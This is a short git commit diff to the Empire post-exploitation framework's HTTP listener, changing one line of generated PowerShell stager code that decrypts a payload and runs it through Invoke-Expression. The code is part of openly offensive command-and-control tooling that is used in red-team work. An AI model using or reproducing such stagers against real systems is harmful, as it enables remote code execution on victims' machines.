19858c20a0be8fc2d10b7936f5b5e22bfd365234
secur3 <ben.miller@ecfirst.com>
2024-07-17 15:29:58 -0500

    minor

--- empire/server/listeners/http.py
+++ empire/server/listeners/http.py
@@ -361,7 +361,7 @@ class Listener:
             stager += "0..300 | ForEach-Object { $t12=$_+$T12 };"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk)); $T5 | IEX"
+            stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk)); IEX -Command $($T5);"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
